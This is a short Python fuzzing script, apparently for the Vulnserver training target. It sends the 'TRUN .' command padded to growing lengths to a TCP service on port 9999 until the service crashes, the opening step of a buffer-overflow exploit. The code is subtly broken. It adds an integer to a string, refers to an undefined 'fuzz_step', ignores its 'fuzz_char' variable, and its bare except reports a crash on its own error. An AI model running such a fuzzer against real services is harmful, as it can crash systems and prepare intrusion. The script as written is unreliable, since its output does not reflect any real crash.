#!/usr/bin/python
import socket, sys
from time import sleep

host = " <Target IP> "
port = 9999

prefix = "TRUN ."
fuzz_char = "A"
fuzz_length = 3000
fuzz_sleep = 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            s.connect((host, port))
            s.recv(1024)
            fuzz_payload = prefix + fuzz_length
            print(f"Fuzzing with {fuzz_length} nbytes")
            s.send(bytes(fuzz_payload, "latin-1"))
            s.recv(1024)
            sleep(1)
            fuzz_length += fuzz_step
    except:
        print(f"Fuzzing crashed at {fuzz_length} bytes")
        sys.exit(0)

